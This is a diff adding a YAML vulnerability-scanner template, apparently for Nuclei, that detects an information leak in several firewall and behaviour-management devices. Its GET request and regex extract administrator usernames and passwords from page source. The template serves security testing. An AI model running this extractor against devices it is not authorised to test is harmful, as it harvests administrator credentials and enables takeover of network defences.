@@ -1,0 +1,33 @@
+id: multiple-firewall-infoleak
+
+info:
+  name: Multiple Firewall Devices Information Leakage Vulnerabilities
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Many security vendors' firewalls and online behavior management equipment have information leakage vulnerabilities. Attackers can obtain user accounts and passwords by reviewing the source code of web pages, which leads to the disclosure of administrator user authentication information. Through this vulnerability, a malicious attacker can obtain the administrator account password and log in to the device to control the firewall or Internet behavior management device.
+  tags:
+    - infoleak
+  reference:
+    - https://forum.butian.net/share/177
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "get_dkey_passwd"
+          - "\"password\":\""
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "\"name\":\"(.*?)\",\"password\":\"(.*?)\""
+        group: 0
